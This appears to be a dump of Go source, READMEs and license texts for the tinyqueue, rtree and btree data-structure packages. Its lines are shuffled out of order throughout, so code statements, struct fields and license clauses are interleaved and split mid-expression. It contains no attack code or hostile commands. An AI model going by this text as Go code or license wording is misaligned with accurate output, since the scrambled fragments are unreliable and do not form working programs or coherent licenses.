"module ""gopkg.in/yaml.v2"""
require (
"<a href=""https://godoc.org/github.com/tidwall/tinyqueue""><img src=""https://img.shields.io/badge/api-reference-blue.svg"
"style=flat-square"" alt=""GoDoc""></a>"
tinyqueue is a Go package for binary heap priority queues.
Ported from the [tinyqueue](https://github.com/mourner/tinyqueue) Javascript library.
 tinyqueue
"Permission to use, copy, modify, and/or distribute this software for any purpose"
"OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER"
"Copyright (c) 2017, Vladimir Agafonkin"
ISC License
"TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF"
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND
THIS SOFTWARE.
"with or without fee is hereby granted, provided that the above copyright notice"
and this permission notice appear in all copies.
"FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,"
"INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS"
"THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH"
i := q.length >> 1
type Queue struct {
q := 
data[pos] = best
current := data[parent]
Queue {
data   []Item
q.data = data
top := q.data[0]
Queue) Peek() Item {
if !best.Less(item) {
left = right
length int
Queue) Pop() Item {
if !item.Less(current) {
for 
"q.data = append(q.data, item)"
q.up(q.length - 1)
halfLength := q.length >> 1
func (q 
return q.length
if right < q.length 
pos = left
if q.length == 0 {
best := data[left]
data[pos] = item
parent := (pos - 1) >> 1
for pos < halfLength {
return top
pos = parent
package tinyqueue
q.length = len(data)
return nil
q.data[0] = q.data[q.length]
Queue{}
Queue) Len() int {
data := q.data
 i >= 0
right := left 
data[pos] = current
if q.length > 0 {
Queue) Push(item Item) {
item := data[pos]
q.down(i)
 data[right].Less(best) {
q.down(0)
q.data = q.data[:len(q.data)-1]
left := (pos << 1) 
func New(data []Item) 
 i-- {
return q.data[0]
q.length--
Less(Item) bool
return q
Queue) down(pos int) {
Queue) up(pos int) {
break
best = data[right]
for pos > 0 {
type Item interface {
q.length
[![GoDoc](https://godoc.org/github.com/tidwall/rtree
[![Build Status](https://travis-ci.org/tidwall/rtree.svg
-------
 2018 Added kNN and merged in some of the RBush logic by Vladimir Agafonkin
License
branch=master)](https://travis-ci.org/tidwall/rtree)
status.svg)](https://godoc.org/github.com/tidwall/rtree)
Authors
 2004 Templated C
 1995 Sphere volume fix for degeneracy problem submitted by Paul Brook
 1994 ANCI C ported from original test code by Melinda Green 
"This package provides an in-memory R-Tree implementation for Go, useful as a spatial data structure."
" 1983 Original algorithm and test code by Antonin Guttman and Michael Stonebraker, UC Berkely"
RTree source code is available under the MIT License.
 port by Greg Douglas
 2016 Go port by Josh Baker
RTree implementation for Go
===========================
"It has support for 1-20 dimensions, and can store and search multidimensions interchangably in the same tree."
"of this software and associated documentation files (the ""Software""), to deal"
The above copyright notice and this permission notice shall be included in
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
THE SOFTWARE.
Copyright (c) 2016 Josh Baker
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
all copies or substantial portions of the Software.
"in the Software without restriction, including without limitation the rights"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"base.RTree, 20)"
queues[minQueue] = queues[minQueue][1:]
if tr.used == 0 {
"return iter(item.(Item), dist)"
return !ended
"if !iter(item.(Item), dist) {"
var j int
"btr.Insert(amin, amax, item)"
done bool
"queues[dims] = append(queues[dims], queueT{item: item.(Item), dist: dist})"
if len(min) < 1 
"panic(""nil bounds being used for search"")"
"panic(""invalid dimension"")"
"base.RTree, min, max []float64, dims int, iter Iterator) bool {"
cond := sync.NewCond(
"amin[i], amax[i] = min[i], max[i]"
amax[i] = max[i]
base.RTree
tr.used
"1, func(item interface{}, dist float64) bool {"
mu.Lock()
func knn(btr 
"delete(queues, i)"
package rtree
var mu sync.Mutex
base.RTree) {
 len(min) > len(tr.trs) {
return tr
"}(dims, btr)"
minItem = queues[i][0].item
amin[i] = min[i]
"base.RTree, min, max []float64, center bool, dims int, iter func(item interface{}, dist float64) bool) bool {"
func search(btr 
dims := i 
"panic(""invalid item rectangle"")"
count 
amin[i] = math.Inf(-1)
= btr.Count()
RTree) Count() int {
"amax := make([]float64, dims)"
"dims:       20,"
"amin := make([]float64, len(min))"
var minQueue int
if len(queues[i]) == 0 {
"ctx:        ctx,"
queues[dims] = []queueT{}
maxEntries int
RTree) Reset() {
tr.trs = make([]
tr.trs[len(min)-1] = nil
"btr.Search(amin, amax, func(item interface{}) bool {"
return count
RTree) Remove(item Item) {
tr.trs[len(min)-1] = btr
if btr != nil {
if len(queues) == 0 {
tr.used = 0
amax[i] = math.Inf(
dist float64
ended = true
minQueue = i
RTree{
if btr == nil {
continue
if bounds == nil {
"knn(btr, min, max, center, dims, func(item interface{}, dist float64) bool {"
for i := range queues {
for {
} else {
item Item
"queues[dims] = append(queues[dims], queueT{done: true})"
queues := make(map[int][]queueT)
break
func (tr 
return true
"for _, btr := range tr.trs {"
tr.trs[i] = nil
if used == 0 {
"if !search(btr, min, max, i"
trs        []
import (
type RTree struct {
"panic(""nil item"")"
"""math"""
ready := true
cond.Signal()
RTree) Insert(item Item) {
type queueT struct {
var count int
"btr.Remove(amin, amax, item)"
if ready {
if j == 0 
"maxEntries: 13,"
for i := 0
if btr.IsEmpty() {
if i < len(min) {
tr := 
 queues[i][0].dist < minDist {
func New(ctx interface{}) 
"RTree) KNN(bounds Item, center bool, iter func(item Item, dist float64) bool) {"
RTree {
 i < dims
"go func(dims int, btr "
"min, max := item.Rect(tr.ctx)"
"RTree) Search(bounds Item, iter Iterator) {"
ready = false
"""github.com/tidwall/rtree/base"""
minDist = queues[i][0].dist
 i < len(min)
"Rect(ctx interface{}) (min []float64, max []float64)"
return // just return
var ended bool
used--
type Item interface {
dims       int
cond.Wait()
if item == nil {
"for i, btr := range tr.trs {"
btr := tr.trs[len(min)-1]
"amax := make([]float64, len(max))"
"btr.KNN(amin, amax, center, func(item interface{}, dist float64) bool {"
type Iterator func(item Item) bool
used := tr.used
"btr = base.New(len(min), tr.maxEntries)"
var minItem Item
if len(min) != len(max) {
return false
"knn(btr, min, max, center, i"
"amin := make([]float64, dims)"
var minDist float64
tr.used--
step int
"min, max := bounds.Rect(tr.ctx)"
"""sync"""
if tr.used == 1 {
 i < len(tr.trs)
ctx        interface{}
if ended {
return
"if !iter(minItem, minDist) {"
used       int
if !iter(item.(Item)) {
if queues[i][0].done {
mu.Unlock()
"1, iter) {"
language: go
dist 
node   
return dist
if last != nil {
treeNode) float64 {
= d 
"func axisDist(k, min, max float64) float64 {"
squared := min - max
 squared
func (item 
 i < len(point)
return k - max
node = (
if a.max[i] < b.max[i] {
return item.dist < b.(
queueItem).isItem {
if isBox {
if squared > 0 {
return 0
return min - k
queueItem).node)
queue := tinyqueue.New(nil)
treeNode)(last.(
"RTree) KNN(min, max []float64, center bool, iter func(item interface{}, dist float64) bool) bool {"
treeNode
"queueItem{node: child, isItem: node.leaf, dist: dist})"
item := queue.Pop().(
 bbox.min[i] != bbox.max[i] {
last := queue.Pop()
isBox = true
} else {
 i < len(a.min)
dist   float64
func (tr 
return true
"func boxDistRect(a, b "
if k <= max {
queueItem) Less(b tinyqueue.Item) bool {
min = b.min[i]
"dist = boxDistRect(bbox, child)"
import (
"""github.com/tidwall/tinyqueue"""
"var min, max float64"
 i < node.count
var isBox bool
isItem bool
queueItem).dist
for queue.Len() > 0 
queue.Push(
bbox := 
 i < tr.dims
"dist = boxDistPoint(knnPoint, child)"
for i := 0
= squared 
"func boxDistPoint(point []float64, childBox "
if k < min {
 queue.Peek().(
min = a.min[i]
 bbox.max[i]) / 2
queueItem)
type queueItem struct {
node = nil
var dist float64
"if !iter(item.node.unsafeItem().item, item.dist) {"
max = b.max[i]
max = a.max[i]
knnPoint[i] = (bbox.min[i] 
return false
"// KNN returns items nearest to farthest. The dist param is the ""box distance""."
"d := axisDist(point[i], childBox.min[i], childBox.max[i])"
if !isBox 
child := node.children[i]
if a.min[i] > b.min[i] {
node := tr.data
"treeNode{min: min, max: max}"
"knnPoint := make([]float64, tr.dims)"
package base
for node != nil {
RTree) Complexity() float64 {
if bbox.intersects(node.children[i]) {
// Count returns the number of items in the R-tree.
minEntries int
"// resusable fields, these help performance of common mutable operations."
treeNode // for reinsertion path
minOverlap = overlap
for 
var minAxis int
return n
//path[i-1].children = siblings
"treeNode, tr.maxEntries"
"treeNode{node, newNode})"
func (item 
"panic(""invalid dimensions"")"
node = (
for i := level
node.children[node.count] = ti.unsafeNode()
treeNode) intersectionArea(b 
if !iter(node.children[i].unsafeItem().item) {
var mathInfPos = math.Inf(
return (
"treeNode, m, M int, axis int) float64 {"
destNode.extend((
contains   result = 2
enlargement = bbox.enlargedArea(child) - area
 i < p
"sortByAxis(items[:left], axis)"
return 0
// Search searches the tree for items in the input rectangle
return intersects
destNode.max[i] = mathInfNeg
if path[i].count == 0 {
if len(min) != tr.dims 
 rightBBox.margin()
"RTree) Search(min, max []float64, iter func(item interface{}) bool) bool {"
return margin
minArea = area
"var bbox1, bbox2 "
for {
treeNode {
if targetNode != nil {
reuse struct {
} else {
node.count--
RTree) chooseSplitIndex(node 
break
if items[i].min[axis] < items[right].min[axis] {
return true
tr.data.height = node.height 
RTree) split(insertPath []
var n int
"return node, path"
RTree) distBBox(node 
"panic(""nil item"")"
 i < node.count
= node.children[i].childCount()
min = b.min[axis]
"tr.remove(bbox, item)"
indexes := tr.reuse.indexes[:0]
not        result = 0
if b.max[i] > node.max[i] {
"splitIndex := tr.chooseSplitIndex(node, m, M)"
"tr.adjustParentBBoxes(bbox, insertPath, level)"
tr.calcBBox(node)
"RTree) Traverse(iter func(min, max []float64, level int, item interface{}) bool) bool {"
 i < tr.dims
"RTree) search(node, bbox "
= rightBBox.margin()
leftBBox.extend(child)
tr.reuse.indexes = indexes
minEnlargement = enlargement
tr.reuse.path = path
"var overlap, area, minOverlap, minArea float64"
= node.max[i] - node.min[i]
node = nil
return i
"if !tr.traverse(child, iter) {"
node = targetNode
"height:   1,"
path[i-1].count--
data       
type treeItem struct {
RTree) IsEmpty() bool {
leftBBox.extend(node.children[i])
"path = append(path, node)"
treeNode) bool {
area = bbox1.area() 
return false
} else if overlap == minOverlap {
"RTree) Bounds() (min, max []float64) {"
"func New(dims, maxEntries int) "
treeNode) area() float64 {
"var max, min float64"
 i >= 0
if destNode == nil {
 axis
n.max[i] = mathInfNeg
height   int
RTree) traverse(node 
// more complex the tree. The value of 1 is the lowest.
return tr.data.childCount()
// New creates a new R-tree
var mathInfNeg = math.Inf(-1)
"treeNode, m, M int) int {"
indexes = indexes[:len(indexes)-1]
for i := k
// otherwise choose distribution with minimum area
return index
treeNode // root node
// Insert inserts an item
treeNode) 
treeNode)(node.children[i]))
n := 
node = path[len(path)-1]
treeItem) unsafeNode() 
targetNode = child
tr.calcBBox(newNode)
"treeNode, path []"
i = 0
spliced := make([]
if !iter(child.unsafeItem().item) {
for i := len(path) - 1
treeNode) contains(b 
if node.leaf {
treeNode) intersectionAreaAxis(b 
if len(path) == 0 {
itemCount
"area := node.intersectionAreaAxis(b, 0)"
treeItem)(unsafe.Pointer(node))
index = i
treeNode) enlargedAreaAxis(b 
if b.min[i] < node.min[i] {
"minMargin := tr.allDistMargin(node, m, M, 0)"
tr.data = tr.createNode(nil) // clear tree
treeNode)(node.children[i])
parent = path[len(path)-1]
area 
area = child.area()
RTree) allDistMargin(node 
 len(path) != 0 {
min = node.min[axis]
"if !scan(node.children[i], iter) {"
tr.reuse.path = insertPath
"return make([]float64, tr.dims), make([]float64, tr.dims)"
 b.max[i] < node.min[i] {
treeNode) intersects(b 
maxEntries int
"treeNode, level int) {"
"tr.chooseSplitAxis(node, m, M)"
"treeNode, k, p int, destNode "
"var rightBBox = tr.distBBox(node, M-m, M, nil)"
treeNode
 len(max) != tr.dims {
RTree) sortNodes(node 
"1:], axis)"
} else if parent != nil { // go right
for i = m
if b.min[axis] < node.min[axis] {
destNode.min[i] = mathInfPos
} else if node.count > 0 {
max = node.max[axis]
"tr.Traverse(func(_, _ []float64, level int, _ interface{}) bool {"
"sortByAxis(node.children[:node.count], axis)"
"left, right := 0, len(items)-1"
if overlap < minOverlap {
treeNode) margin() float64 {
minArea = mathInfPos
index = node.findItem(item)
var nodeCount int
children: make([]
ti := 
treeNode) (
if tr.data.count > 0 {
path    []
goingUp = true
if node.leaf 
treeNode)(node.children[0])
children []
minAxis = axis
"items[pivotIndex], items[right] = items[right], items[pivotIndex]"
tr.data = tr.createNode([]
func (node 
if node.max[axis] < b.max[axis] {
if node.min[axis] > b.min[axis] {
"RTree) Insert(min, max []float64, item interface{}) {"
"bbox := treeNode{min: min, max: max}"
for i := 1
var siblings []
treeNode) extend(b 
for i := range items {
if item == nil {
tr.reuse.path = tr.reuse.path[:0]
var node = insertPath[level]
minMargin = margin
minArea = minEnlargement
"treeNode, m, M int) {"
return area
// Remove removes an item from the R-tree.
goto done
 b.max[i] > node.max[i] {
var goingUp bool
intersects result = 1
"insertPath = tr.split(insertPath, level)"
var m = tr.minEntries
// adjust bboxes along the given tree path
leaf     bool
"treeNode, level int, path []"
 axis < tr.dims
"treeNode{min: min, max: max}"
"""unsafe"""
"if !iter(child.min, child.max, 0, child.unsafeItem().item) {"
return destNode
package base
} else if r == contains {
"panic(""loading node into leaf"")"
// item is only nil when bulk loading a node
"treeNode, iter func(item interface{}) bool) bool {"
const (
if i > 0 {
"treeNode, []"
 bbox2.area()
treeNode) enlargedArea(b 
if b.min[i] > node.max[i] 
var targetNode 
path = path[:len(path)-1]
if !tr.data.intersects(bbox) {
tr.calcBBox(tr.data)
i = indexes[len(indexes)-1]
done:
return tr
"tr.minEntries = int(math.Max(2, math.Ceil(float64(tr.maxEntries)"
if node == nil {
"treeNode, iter func(min, max []float64, level int, item interface{}) bool) bool {"
insertPath[level-1].children[insertPath[level-1].count] = newNode
"var leftBBox = tr.distBBox(node, 0, m, nil)"
tr.data.leaf = false
pivotIndex := len(items) / 2
if r == intersects {
tr.insert(
type treeNode struct {
"margin := tr.allDistMargin(node, m, M, axis)"
RTree) Count() int {
// Bounds returns the bounding box of the entire R-tree
= leftBBox.margin()
treeNode) unsafeItem() 
if i == parent.count {
if margin < minMargin {
treeNode)(parent.children[i])
"treeNode, item interface{}, level int, isNode bool) {"
func sortByAxis(items []
for j := 0
tr.data = tr.createNode(nil)
minEnlargement = mathInfPos
"return tr.traverse(tr.data, iter)"
if level != 0 {
treeNode) findItem(item interface{}) int {
"= node.enlargedAreaAxis(b, i)"
node.children[node.count-1] = nil
if index != -1 {
 len(path)-1 == level {
var i int
path := tr.reuse.path[:0]
if level == 0 {
func (tr 
 !node.leaf 
RTree{}
max = b.max[axis]
margin 
var node = tr.data
if node.min[i] > b.min[i] 
if insertPath[level].count > tr.maxEntries {
if !goingUp 
"""math"""
indexes []int       // for remove function
nodeCount) / float64(itemCount)
if len(children) > 0 {
node.max[i] = b.max[i]
r := bbox.overlaps(node.children[i])
"// Complexity returns the complexity of the R-tree. The higher the value, the"
child := (
"bbox2 = tr.distBBox(node, i, M, nil)"
tr := 
"return tr.data.min, tr.data.max"
"treeNode, level int) []"
"tr.sortNodes(node, axis)"
parent = node
return contains
newNode.height = node.height
"if !scan(child, iter) {"
 i-- {
if area < minArea {
"treeNode, item interface{}) {"
} else if enlargement == minEnlargement {
if len(items) < 2 {
empty := true
nodeCount
"RTree) chooseSubtree(bbox, node "
type result int
dims       int
"tr.maxEntries = int(math.Max(4, float64(maxEntries)))"
"copy(spliced, node.children[splitIndex:])"
var index int
siblings = path[i-1].children[:path[i-1].count]
insertPath[level-1].count
var margin = leftBBox.margin() 
"= node.intersectionAreaAxis(b, i)"
 j < len(siblings)
0.4)))
 i < M-m
siblings[len(siblings)-1] = nil
if node.children[i].unsafeItem().item == item {
"tr.sortNodes(node, minAxis)"
"area := node.enlargedAreaAxis(b, 0)"
var M = node.count
minOverlap = minArea
child := node.children[i]
RTree) adjustParentBBoxes(bbox 
for level >= 0 {
level--
"var area, enlargement, minArea, minEnlargement float64"
if siblings[j] == path[i] {
area := node.max[0] - node.min[0]
"return scan(tr.data, iter)"
func scan(node 
"node, insertPath := tr.chooseSubtree(bbox, tr.data, level, tr.reuse.path)"
"bbox, item, tr.data.height-1, false)"
node.children[node.count] = bbox
newNode := tr.createNode(spliced)
for axis := 1
if max > min {
if b.max[axis] > node.max[axis] {
RTree) remove(bbox 
treeNode) childCount() int {
"tr.distBBox(node, 0, node.count, node)"
"copy(n.children[:n.count], children)"
"treeNode, axis int) float64 {"
return not
destNode.extend(node.children[i])
"if !tr.search(node.children[i], bbox, iter) {"
var itemCount int
RTree) createNode(children []
treeNode) float64 {
var parent 
 node.contains(bbox) { // go down
parent = nil
treeNode) overlaps(b 
newNode.leaf = node.leaf
"min, max []float64"
 i >= m
tr.Scan(func(item interface{}) bool {
"// go through the path, removing empty nodes and updating bboxes"
"items[i], items[left] = items[left], items[i]"
"tr.splitRoot(node, newNode)"
"n.min = make([]float64, tr.dims)"
RTree) condense(path []
node.count = splitIndex
1:])
// precalculate infinity
overlap = bbox1.intersectionArea(bbox2)
path[i].extend(bbox)
"copy(siblings[index:], siblings[index"
treeNode) result {
"treeItem{min: bbox.min, max: bbox.max, item: item}"
n.count = len(children)
"return tr.search(tr.data, bbox, iter)"
treeItem {
return -1
sortByAxis(items[left
"// item found, remove the item and condense tree upwards"
"bbox1 = tr.distBBox(node, 0, i, nil)"
if enlargement < minEnlargement {
treeNode{
treeNode) {
import (
type RTree struct {
stack   []int       // for bulk loading
treeNode)(unsafe.Pointer(item))
"RTree) splitRoot(node, newNode "
destNode = tr.createNode(nil)
RTree) calcBBox(node 
n.min[i] = mathInfPos
// choose distribution with minimum overlap
 i <= M-m
node.count
tr.condense(path)
node.extend(bbox)
return float64(tr.maxEntries
bbox := 
"copy(node.children[index:], node.children[index"
"indexes = append(indexes, i)"
tr.calcBBox(path[i])
for i := 0
if dims <= 0 {
index = j
RTree {
RTree) insert(bbox 
RTree) chooseSplitAxis(node 
item     interface{}
"treeNode, axis int) {"
for node != nil 
"items[left], items[right] = items[right], items[left]"
empty = false
"treeNode, node.count-splitIndex)"
"n.max = make([]float64, tr.dims)"
index := -1
for i = M - m - 1
return empty
//siblings = siblings[:len(siblings)-1]
// RTree is an R-tree
"leaf:     true,"
tr.dims = dims
RTree) Scan(iter func(item interface{}) bool) bool {
 i < len(node.min)
count    int
return insertPath
if minAxis < tr.dims {
node.min[i] = b.min[i]
// Traverse iterates over the entire R-tree and includes all nodes and items.
goingUp = false
margin := node.max[0] - node.min[0]
return node.count
// Scan iterates over the entire R-tree
return
left
"RTree) Remove(min, max []float64, item interface{}) {"
"if !iter(node.min, node.max, int(node.height), nil) {"
return max - min
M := tr.maxEntries
// Load bulk load items into the R-tree.
N := len(fitems)
node := tr.createNode(children)
axis := 0
"copy(children, fitems)"
"treeItem{min: mins[i], max: maxs[i], item: items[i]}"
part = fitems[len(fitems)/S
"treeNode, h, axis int) "
if i == S-1 {
"treeNode, len(fitems))"
part = fitems[partsz
// last split
tr.data = node
node.height = h
i : partsz
// swap trees if inserted one is bigger
"import ""math"""
 return leaf
if i == tr.maxEntries-1 {
"treeNode, 0, S)"
if tr.data.count == 0 {
treeNode
// prefill the items
tr.calcBBox(node)
"tr.insert(node, nil, tr.data.height-node.height-1, true)"
fitems := make([]
// sort by the initial axis
"treeNode, 0, tr.maxEntries)"
// insert the small tree into the large tree at appropriate level
"Nsubtree := int(math.Pow(float64(M), float64(h-1)))"
for i := 0
i : len(fitems)/S
partsz := len(fitems) / tr.maxEntries
// sort the items on a different axis than the previous level.
S := int(math.Ceil(math.Sqrt(float64(N) / float64(Nsubtree))))
"RTree) Load(mins, maxs [][]float64, items []interface{}) {"
node.leaf = false
// save as is if tree is empty
} else if tr.data.height == node.height {
// reached leaf level
treeNode {
 i < S
var part []
item := 
return node
// following equations are defined in the paper describing OMT
 i < tr.maxEntries
fitems[i] = item.unsafeNode()
h := int(math.Ceil(math.Log(float64(N)) / math.Log(float64(M))))
} else {
// build the root node. it's split differently from the subtrees.
children := make([]
"children = append(children, tr.omt(part, h-1, axis"
if len(items) < tr.minEntries {
// split root if trees have the same height
return
"tr.splitRoot(tr.data, node)"
"sortByAxis(fitems, axis%tr.dims)"
RTree) omt(fitems []
 i < len(items)
if len(fitems) <= tr.maxEntries {
func (tr 
"tr.Insert(mins[i], maxs[i], items[i])"
// last part
package base
if tr.data.height < node.height {
"tr.data, node = node, tr.data"
"sortByAxis(fitems, axis)"
"treeNode, len(items))"
// Iterate over each user in the val tree
"""fmt"""
"""github.com/tidwall/btree"""
![Travis CI Build Status](https://api.travis-ci.org/tidwall/btree.svg
case string:
} else if i1.Val > i2.Val {
"// The ""values"" tree will be sorted on the Values field."
// Should see the results
import (
user:6 Andy
"for _, user := range users {"
keys.Ascend(func(item btree.Item) bool {
For example:
switch tag := ctx.(type) {
func (i1 
- Iteration performance boost.
vals.Ascend(func(item btree.Item) bool {
vals.ReplaceOrInsert(user)
"fmt.Printf("""
"Item{Key: ""user:5"", Val: ""Janet""},"
 functions for iterating backwards.
if i1.Val < i2.Val {
return i1.Key < i2.Key
"Key, Val string"
--------------------
This is a fork of the wonderful [google/btree](https://github.com/google/btree) package. It's has all the same great features and adds a few more.
kvi := item.(
// Iterate over each user in the key tree
"keys := btree.New(16, ""keys"")"
// and let the key comparison take over.
return false
// Create some items.
// Insert each user into both trees
"an ordered, mutable data structure."
"n"", kvi.Key, kvi.Val)"
- User defined context.
branch=master)
users := []
user:4 Andrea
"This package provides an in-memory B-Tree implementation for Go, useful as"
"vals := btree.New(16, ""vals"")"
keys.ReplaceOrInsert(user)
"// The ""keys"" tree will be sorted on the Keys field."
"Item{Key: ""user:4"", Val: ""Andrea""},"
[![GoDoc](https://godoc.org/github.com/tidwall/btree
Item)
"Item) Less(item btree.Item, ctx interface{}) bool {"
i2 := item.(
// Create a tree for keys and a tree for values.
user:1 Jane
user:5 Janet
func main() {
Item{
BTree implementation for Go
"Item{Key: ""user:3"", Val: ""Steve""},"
status.svg)](https://godoc.org/github.com/tidwall/btree)
"Item{Key: ""user:6"", Val: ""Andy""},"
"fmt.Printf(""%s %s"
"if tag == ""vals"" {"
return true
"This is a great new feature that allows for entering the same item into multiple B-trees, and each B-tree have a different ordering formula."
// Both vals are equal so we should fall though
"Item{Key: ""user:1"", Val: ""Jane""},"
"Item{Key: ""user:2"", Val: ""Andy""},"
type Item struct {
user:2 Andy
package main
user:3 Steve
- Descend
===========================
User defined context
"      To apply the Apache License to your work, attach the following"
      meet the following conditions:
 within the Source form or
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      incidental, or consequential damages of any character arising as a"
"          that You distribute, all copyright, patent, trademark, and"
          the Derivative Works
"      communication on electronic mailing lists, source code control systems,"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      for any such Derivative Works as a whole, provided Your use,"
"      reproduction, and distribution of the Work otherwise complies with"
   2. Grant of Copyright License. Subject to the terms and conditions of
"          or as an addendum to the NOTICE text from the Work, provided"
   4. Redistribution. You may reproduce and distribute copies of the
      may provide additional or different license terms and conditions
      or by an individual or Legal Entity authorized to submit on behalf of
      as of the date such litigation is filed.
"      or contributory patent infringement, then any patent licenses"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
      Contribution(s) alone or by combination of their Contribution(s)
      or other liability obligations and/or rights consistent with this
"      designated in writing by the copyright owner as ""Not a Contribution."""
      subsequently incorporated within the Work.
      with Licensor regarding such Contributions.
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      excluding communication that is conspicuously marked or otherwise
"          documentation, if provided along with the Derivative Works"
"      names, trademarks, service marks, or product names of the Licensor,"
      (a) You must give any other recipients of the Work or
"      same ""printed page"" as the copyright notice for easier"
      comment syntax for the file format. We also recommend that a
"      means any form of electronic, verbal, or written communication sent"
"                           Version 2.0, January 2004"
"      copyright license to reproduce, prepare Derivative Works of,"
      origin of the Work and reproducing the content of the NOTICE file.
"   8. Limitation of Liability. In no event and under no legal theory,"
"      (c) You must retain, in the Source form of any Derivative Works"
          do not modify the License. You may add Your own attribution
"      other entities that control, are controlled by, or are under common"
"          notices within Derivative Works that You distribute, alongside"
                                 Apache License
"      transformation or translation of a Source form, including but"
          that such additional attribution notices cannot be construed
"      incurred by, or claims asserted against, such Contributor by reason"
      the brackets!)  The text should be enclosed in the appropriate
"      Licensor for the purpose of discussing and improving the Work, but"
"      (except as stated in this section) patent license to make, have made,"
   9. Accepting Warranty or Additional Liability. While redistributing
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
          include a readable copy of the attribution notices contained
   APPENDIX: How to apply the Apache License to your work.
"   Licensed under the Apache License, Version 2.0 (the ""License"")"
      file or class name and description of purpose be included on the
"      of any other Contributor, and only if You agree to indemnify,"
      and distribution as defined by Sections 1 through 9 of this document.
 and
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
      Work and such Derivative Works in Source or Object form.
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      of this License, Derivative Works shall not include works that remain"
"      direction or management of such entity, whether by contract or"
"      whether in tort (including negligence), contract, or otherwise,"
      appropriateness of using or redistributing the Work and assume any
"      ""Contribution"" shall mean any work of authorship, including"
      and conversions to other media types.
"      agreed to in writing, Licensor provides the Work (and each"
"      publicly display, publicly perform, sublicense, and distribute the"
      institute patent litigation against any entity (including a
          excluding those notices that do not pertain to any part of
      by You to the Licensor shall be under the terms and conditions of
"      represent, as a whole, an original work of authorship. For the purposes"
      or a Contribution incorporated within the Work constitutes direct
"      source, and configuration files."
   you may not use this file except in compliance with the License.
"      to the Licensor or its representatives, including but not limited to"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"      ""Work"" shall mean the work of authorship, whether in Source or"
      where such license applies only to those patent claims licensable
"      ""Legal Entity"" shall mean the union of the acting entity and all"
   END OF TERMS AND CONDITIONS
      (b) You must cause any modified files to carry prominent notices
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      Work or Derivative Works thereof in any medium, with or without"
          of the NOTICE file are for informational purposes only and
"      for use, reproduction, or distribution of Your modifications, or"
          Derivative Works a copy of this License
"          within a display generated by the Derivative Works, if and"
          as modifying the License.
          wherever such third-party notices normally appear. The contents
      (an example is provided in the Appendix below).
      unless required by applicable law (such as deliberate and grossly
   1. Definitions.
"      to that Work or Derivative Works thereof, that is intentionally"
       http://www.apache.org/licenses/LICENSE-2.0
      submitted to Licensor for inclusion in the Work by the copyright owner
"      including but not limited to software source code, documentation"
"      outstanding shares, or (iii) beneficial ownership of such entity."
      with the Work to which such Contribution(s) was submitted. If You
      the terms of any separate license agreement you may have executed
          as part of the Derivative Works
"      liable to You for damages, including any direct, indirect, special,"
      on behalf of whom a Contribution has been received by Licensor and
"      the Work or Derivative Works thereof, You may choose to offer,"
"      implied, including, without limitation, any warranties or conditions"
      of your accepting any such warranty or additional liability.
"      Object form, made available under the License, as indicated by a"
   See the License for the specific language governing permissions and
"          pertain to any part of the Derivative Works, in at least one"
                        http://www.apache.org/licenses/
      the Work and Derivative Works thereof.
   You may obtain a copy of the License at
"          distribution, then any Derivative Works that You distribute must"
      except as required for reasonable and customary use in describing the
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
      identification within third-party archives.
      You may add Your own copyright statement to Your modifications and
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
          of the following places: within a NOTICE text file distributed
"      control with that entity. For the purposes of this definition,"
"      Work (including but not limited to damages for loss of goodwill,"
"      ""control"" means (i) the power, direct or indirect, to cause the"
      has been advised of the possibility of such damages.
      copyright notice that is included in or attached to the work
"      this License, each Contributor hereby grants to You a perpetual,"
      by such Contributor that are necessarily infringed by their
"          within such NOTICE file, excluding those notices that do not"
      the conditions stated in this License.
   6. Trademarks. This License does not grant permission to use the trade
"      work stoppage, computer failure or malfunction, or any and all"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"   distributed under the License is distributed on an ""AS IS"" BASIS,"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      other commercial damages or losses), even if such Contributor"
"      modifications, and in Source or Object form, provided that You"
   7. Disclaimer of Warranty. Unless required by applicable law or
"      this License, without any additional terms or conditions."
"   Unless required by applicable law or agreed to in writing, software"
"      editorial revisions, annotations, elaborations, or other modifications"
"      ""Source"" form shall mean the preferred form for making modifications,"
      any Contribution intentionally submitted for inclusion in the Work
      risks associated with Your exercise of permissions under this License.
"      not limited to compiled object code, generated documentation,"
